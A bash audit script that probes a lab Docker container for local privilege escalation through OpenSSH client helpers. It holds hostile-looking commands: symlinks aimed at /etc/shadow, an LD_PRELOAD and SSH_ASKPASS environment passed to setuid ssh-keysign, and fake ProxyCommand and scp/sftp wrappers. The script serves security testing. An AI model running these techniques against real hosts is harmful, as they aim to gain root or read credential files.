#!/usr/bin/env bash
set -u

container="${1:-ubuntu24-server-lpe-target}"

section() {
  printf '\n===== %s =====\n' "$*"
}

run() {
  printf '\n$'
  printf ' %q' "$@"
  printf '\n'
  "$@" 2>&1
  rc=$?
  printf '[rc=%d]\n' "$rc"
  return 0
}

section "container and OS baseline"
run docker inspect --format '{{.Name}} {{.Config.Image}} {{.State.Status}} {{.State.StartedAt}}' "$container"
run docker exec "$container" bash -lc 'systemctl is-system-running; systemctl --failed --no-legend | wc -l; cat /etc/os-release; uname -a; id attacker; id selfauth'

section "OpenSSH package and default reachability proof"
run docker exec "$container" bash -lc '
  for p in openssh-client openssh-server openssh-sftp-server libutempter0; do
    dpkg-query -W -f='\''${binary:Package}\t${Version}\t${db:Status-Abbrev}\n'\'' "$p" 2>/dev/null || printf "%s\t<not-installed>\tun\n" "$p"
  done
  printf "\n-- apt-cache policy --\n"
  apt-cache policy openssh-client openssh-server openssh-sftp-server 2>/dev/null | sed -n "1,160p"
  printf "\n-- services/listeners --\n"
  systemctl --no-pager is-enabled ssh.service ssh.socket 2>&1 || true
  systemctl --no-pager is-active ssh.service ssh.socket 2>&1 || true
  systemctl status ssh.service ssh.socket --no-pager --lines=0 2>&1 || true
  ss -ltnp
'

section "OpenSSH file, config, host-key, PAM, and helper inventory"
run docker exec "$container" bash -lc '
  printf "\n-- package file list --\n"
  dpkg-query -L openssh-client | sort
  printf "\n-- relevant modes --\n"
  for f in \
    /etc/ssh /etc/ssh/ssh_config /etc/ssh/ssh_config.d \
    /usr/bin/ssh /usr/bin/scp /usr/bin/sftp /usr/bin/ssh-agent /usr/bin/ssh-add /usr/bin/ssh-keygen /usr/bin/ssh-keyscan \
    /usr/lib/openssh/agent-launch /usr/lib/openssh/ssh-keysign /usr/lib/openssh/ssh-pkcs11-helper /usr/lib/openssh/ssh-sk-helper \
    /usr/lib/systemd/user/ssh-agent.service /usr/lib/systemd/user/graphical-session-pre.target.wants/ssh-agent.service \
    /usr/lib/aarch64-linux-gnu/utempter/utempter; do
    [ -e "$f" ] && stat -c "%A %a %U %G %n" "$f"
  done
  printf "\n-- absent server-side files --\n"
  ls -l /usr/sbin/sshd /etc/ssh/sshd_config /etc/pam.d/sshd /etc/ssh/ssh_host_* /usr/lib/openssh/sftp-server 2>&1 || true
  printf "\n-- active ssh_config lines --\n"
  nl -ba /etc/ssh/ssh_config
  printf "\n-- user ssh-agent service --\n"
  nl -ba /usr/lib/systemd/user/ssh-agent.service
  printf "\n-- agent-launch helper --\n"
  nl -ba /usr/lib/openssh/agent-launch
  printf "\n-- helper embedded path hints --\n"
  if command -v strings >/dev/null 2>&1; then
    strings /usr/lib/openssh/ssh-keysign
  else
    tr "\000" "\n" < /usr/lib/openssh/ssh-keysign
  fi | grep -E "/etc/ssh|ssh-keysign|not enabled|hostbased|ssh_host" | sort -u | sed -n "1,120p"
'

section "attacker write boundary checks for OpenSSH roots"
run docker exec "$container" bash -lc '
  runuser -u attacker -- bash -lc '"'"'
    set -u
    echo "attacker id: $(id)"
    for d in /etc/ssh /etc/ssh/ssh_config.d /usr/lib/openssh /usr/lib/systemd/user /etc/X11 /usr/sbin; do
      if [ -d "$d" ]; then
        f="$d/openssh-local-deep-write-probe"
        if (: > "$f") 2>/dev/null; then
          echo "UNEXPECTED_WRITE_OK $f"
          rm -f "$f"
        else
          echo "write_denied $f"
        fi
      else
        echo "missing_dir $d"
      fi
    done
    for f in /etc/ssh/ssh_config /usr/lib/openssh/ssh-keysign /usr/lib/openssh/ssh-pkcs11-helper /usr/lib/openssh/ssh-sk-helper /usr/lib/openssh/agent-launch /usr/lib/systemd/user/ssh-agent.service; do
      if [ -e "$f" ]; then
        if [ -w "$f" ]; then echo "UNEXPECTED_FILE_WRITABLE $f"; else echo "file_not_writable $f"; fi
      fi
    done
  '"'"'
'

section "in-container attacker-triggered helper probes"
run docker exec -i "$container" bash -s <<'INNER'
set -u

section() {
  printf '\n----- %s -----\n' "$*"
}

run() {
  printf '\n#'
  printf ' %q' "$@"
  printf '\n'
  "$@" 2>&1
  rc=$?
  printf '[rc=%d]\n' "$rc"
  return 0
}

root_marker="/tmp/openssh-local-deep-root-marker"
user_marker="/tmp/openssh-local-deep-user-marker"
attacker_work="$(runuser -u attacker -- mktemp -d /tmp/openssh-local-deep-attacker.XXXXXX)"

cleanup() {
  rm -f "$root_marker" "$user_marker"
  runuser -u attacker -- bash -lc '
    rm -rf /tmp/openssh-local-deep-attacker.* /tmp/openssh-agent-symlink.* /tmp/openssh-controlpath.* /tmp/openssh-local-deep-*.out "$HOME/.ssh/openssh-local-deep" 2>/dev/null || true
    pkill -u attacker -f "ssh-agent -D -a /tmp/openssh-local-deep" 2>/dev/null || true
    pkill -u attacker -x ssh-agent 2>/dev/null || true
    pkill -u attacker -x ssh-keygen 2>/dev/null || true
    pkill -u attacker -x ssh-sk-helper 2>/dev/null || true
  '
  pkill -u attacker -x ssh-agent 2>/dev/null || true
  pkill -u attacker -x ssh-keygen 2>/dev/null || true
  pkill -u attacker -x ssh-sk-helper 2>/dev/null || true
  systemctl reset-failed ssh.service ssh.socket ssh-agent.service 2>/dev/null || true
}
trap cleanup EXIT

printf 'attacker_work=%s\n' "$attacker_work"
rm -f "$root_marker" "$user_marker"

section "client defaults, user override display, and absent localhost server"
run runuser -u attacker -- ssh -G -T localhost
run runuser -u attacker -- bash -lc 'ssh -G -T -oHostbasedAuthentication=yes -oEnableSSHKeysign=yes localhost | egrep "^(host |user |hostname |port |hostbasedauthentication |enablesshkeysign |globalknownhostsfile |userknownhostsfile |securitykeyprovider |identityagent )"'
run runuser -u attacker -- bash -lc 'mkdir -p "$HOME/.ssh/openssh-local-deep"; ln -sf /etc/shadow "$HOME/.ssh/openssh-local-deep/known_hosts"; ssh -oBatchMode=yes -oConnectTimeout=1 -oUserKnownHostsFile="$HOME/.ssh/openssh-local-deep/known_hosts" -vvv 127.0.0.1 true 2>&1 | sed -n "/known_hosts/p;/Connection refused/p;/Permission denied/p"; rm -rf "$HOME/.ssh/openssh-local-deep"'

section "ssh-keysign direct and hostile environment checks"
run runuser -u attacker -- bash -lc '/usr/lib/openssh/ssh-keysign </dev/null; printf "keysign_rc=%s\n" "$?"'
run runuser -u attacker -- bash -lc '
  set -u
  w="'"$attacker_work"'"
  mkdir -p "$w/bin" "$w/home"
  cat > "$w/bin/ssh-keygen" <<EOF
#!/bin/sh
id > '"$root_marker"'
exit 0
EOF
  chmod +x "$w/bin/ssh-keygen"
  printf "not-elf" > "$w/preload.so"
  env -i HOME="$w/home" PATH="$w/bin:/usr/bin:/bin" DISPLAY=:99 SSH_ASKPASS="$w/bin/ssh-keygen" SSH_AUTH_SOCK="$w/agent.sock" LD_PRELOAD="$w/preload.so" /usr/lib/openssh/ssh-keysign </dev/null 2>&1 || true
  if [ -e '"$root_marker"' ]; then echo "ROOT_MARKER_CREATED"; cat '"$root_marker"'; else echo "no_root_marker_from_keysign_env"; fi
'
run bash -lc 'if [ -e '"$root_marker"' ]; then echo ROOT_MARKER_PRESENT; cat '"$root_marker"'; else echo no_root_marker_after_keysign; fi'

section "ssh hostbased path cannot reach keysign without a server auth exchange"
run runuser -u attacker -- bash -lc '
  w="'"$attacker_work"'"
  strace -f -o "$w/ssh-hostbased.strace" -e trace=execve ssh -oBatchMode=yes -oConnectTimeout=1 -oHostbasedAuthentication=yes -oEnableSSHKeysign=yes 127.0.0.1 true >/tmp/openssh-local-deep-hostbased.out 2>&1 || true
  sed -n "1,40p" /tmp/openssh-local-deep-hostbased.out
  if grep -q "ssh-keysign" "$w/ssh-hostbased.strace"; then echo "UNEXPECTED_KEYSIGN_EXEC"; grep "ssh-keysign" "$w/ssh-hostbased.strace"; else echo "no_ssh_keysign_exec_before_connection_refused"; fi
  rm -f /tmp/openssh-local-deep-hostbased.out
'

section "ssh-agent default, setgid drop, and custom socket/symlink behavior"
run runuser -u attacker -- ssh-agent sh -c 'id; printf "SSH_AUTH_SOCK=%s\nSSH_AGENT_PID=%s\n" "$SSH_AUTH_SOCK" "$SSH_AGENT_PID"; stat -c "%F %A %a %U %G %n" "$(dirname "$SSH_AUTH_SOCK")" "$SSH_AUTH_SOCK"; ps -o pid,user,group,euid,egid,comm -p "$SSH_AGENT_PID"; ssh-add -l 2>&1'
run runuser -u attacker -- bash -lc '
  tmp=$(mktemp -d /tmp/openssh-agent-symlink.XXXXXX)
  sock="$tmp/sock"
  ln -s /etc/shadow "$sock"
  echo "before_symlink=$(ls -l "$sock")"
  ssh-agent -a "$sock" sh -c '"'"'echo inside_agent_shell; id; printf "sock=%s pid=%s\n" "$SSH_AUTH_SOCK" "$SSH_AGENT_PID"; [ -n "$SSH_AGENT_PID" ] && ps -o pid,user,group,euid,egid,comm -p "$SSH_AGENT_PID" || true; [ -n "$SSH_AUTH_SOCK" ] && stat -c "%F %A %a %U %G %n" "$SSH_AUTH_SOCK" || true'"'"' 2>&1 || true
  echo "after_listing"; ls -la "$tmp"; stat -c "shadow:%s:%U:%G:%a" /etc/shadow
  rm -rf "$tmp"
'

section "ssh-agent PKCS11 and security-key provider helper paths remain attacker-owned"
run runuser -u attacker -- bash -lc '
  w="'"$attacker_work"'"
  printf "not-a-shared-object" > "$w/notso.so"
  ssh-agent -a "$w/pkcs11-agent.sock" sh -c '"'"'
    echo "agent_shell_id=$(id)"
    ps -o pid,user,group,euid,egid,comm -p "$SSH_AGENT_PID"
    SSH_AUTH_SOCK="$SSH_AUTH_SOCK" strace -f -o "'"$attacker_work"'/ssh-add-pkcs11.strace" -e trace=execve,setuid,setgid,setresuid,setresgid ssh-add -s "'"$attacker_work"'/notso.so" </dev/null >/tmp/openssh-local-deep-sshadd.out 2>&1 || true
    sed -n "1,80p" /tmp/openssh-local-deep-sshadd.out
  '"'"'
  echo "-- ssh-add helper exec trace --"
  grep -E "ssh-pkcs11-helper|set(uid|gid)|setres(uid|gid)|execve" "$w/ssh-add-pkcs11.strace" | sed -n "1,120p" || true
  rm -f /tmp/openssh-local-deep-sshadd.out
'
run runuser -u attacker -- bash -lc '
  w="'"$attacker_work"'"
  timeout 5s strace -f -o "$w/ssh-keygen-sk.strace" -e trace=execve,setuid,setgid,setresuid,setresgid ssh-keygen -q -t ed25519-sk -f "$w/skkey" -N "" -w "$w/notso.so" >/tmp/openssh-local-deep-sk.out 2>&1 || true
  sed -n "1,80p" /tmp/openssh-local-deep-sk.out
  echo "-- sk helper exec trace --"
  grep -E "ssh-sk-helper|set(uid|gid)|setres(uid|gid)|execve" "$w/ssh-keygen-sk.strace" | sed -n "1,120p" || true
  rm -f /tmp/openssh-local-deep-sk.out
'

section "agent-launch user service helper is gated by absent X11 option file"
run runuser -u attacker -- bash -lc '
  w="'"$attacker_work"'"
  mkdir -p "$w/xdg"
  XDG_RUNTIME_DIR="$w/xdg" SSH_AUTH_SOCK= SSH_AGENT_LAUNCHER= /usr/lib/openssh/agent-launch start -- -a "$w/agent-launch.sock" >/tmp/openssh-local-deep-agent-launch.out 2>&1 || true
  sed -n "1,80p" /tmp/openssh-local-deep-agent-launch.out
  if [ -S "$w/agent-launch.sock" ]; then echo "UNEXPECTED_AGENT_LAUNCH_SOCKET"; else echo "no_agent_launch_socket_without_/etc/X11/Xsession.options"; fi
  rm -f /tmp/openssh-local-deep-agent-launch.out
'

section "ControlPath, ProxyCommand, scp -S, and sftp -S execute only as attacker"
run runuser -u attacker -- bash -lc '
  w="'"$attacker_work"'"
  ln -s /etc/shadow "$w/control.sock"
  ssh -M -S "$w/control.sock" -oControlMaster=yes -oControlPath="$w/control.sock" -oBatchMode=yes -oConnectTimeout=1 127.0.0.1 true >/tmp/openssh-local-deep-control.out 2>&1 || true
  sed -n "1,60p" /tmp/openssh-local-deep-control.out
  ls -l "$w/control.sock"
  stat -c "shadow:%s:%U:%G:%a" /etc/shadow
  rm -f /tmp/openssh-local-deep-control.out
'
run runuser -u attacker -- bash -lc '
  w="'"$attacker_work"'"
  cat > "$w/fake-ssh" <<EOF
#!/bin/sh
id >> "'"$user_marker"'"
printf "fake-ssh argv:" >> "'"$user_marker"'"
printf " [%s]" "\$@" >> "'"$user_marker"'"
printf "\\n" >> "'"$user_marker"'"
exit 1
EOF
  chmod +x "$w/fake-ssh"
  ssh -oBatchMode=yes -oProxyCommand="$w/fake-ssh %h %p" ignored-host true >/tmp/openssh-local-deep-proxy.out 2>&1 || true
  scp -S "$w/fake-ssh" /etc/hosts ignored-host:/tmp/ignored >/tmp/openssh-local-deep-scp.out 2>&1 || true
  printf "quit\n" | sftp -S "$w/fake-ssh" ignored-host >/tmp/openssh-local-deep-sftp.out 2>&1 || true
  echo "-- proxy/scp/sftp marker --"
  cat "'"$user_marker"'" 2>/dev/null || true
  echo "-- command outputs --"
  sed -n "1,30p" /tmp/openssh-local-deep-proxy.out
  sed -n "1,30p" /tmp/openssh-local-deep-scp.out
  sed -n "1,30p" /tmp/openssh-local-deep-sftp.out
  rm -f /tmp/openssh-local-deep-proxy.out /tmp/openssh-local-deep-scp.out /tmp/openssh-local-deep-sftp.out
'

section "utempter adjacency does not give root"
run bash -lc 'ldd /usr/bin/ssh /usr/lib/openssh/ssh-keysign 2>/dev/null | grep -i utempter || true; getent group utmp _ssh; find / -xdev \( -group utmp -o -group _ssh \) -ls 2>/dev/null | sed -n "1,120p"'
run runuser -u attacker -- bash -lc '/usr/lib/aarch64-linux-gnu/utempter/utempter 2>&1 | sed -n "1,40p"; printf "utempter_rc=%s\n" "$?"'

section "root proof check and health"
run bash -lc 'if [ -e '"$root_marker"' ]; then echo "ROOT_MARKER_PRESENT"; cat '"$root_marker"'; else echo "no root marker created by OpenSSH deep probe"; fi'
run bash -lc 'systemctl is-system-running; systemctl --failed --no-legend | wc -l'
INNER

section "post-probe cleanup verification"
run docker exec "$container" bash -lc 'find /tmp -maxdepth 1 \( -name "openssh-local-deep-*" -o -name "openssh-agent-symlink.*" -o -name "openssh-controlpath.*" \) -print; pgrep -a -u attacker ssh-agent || true; systemctl is-system-running; systemctl --failed --no-legend | wc -l'
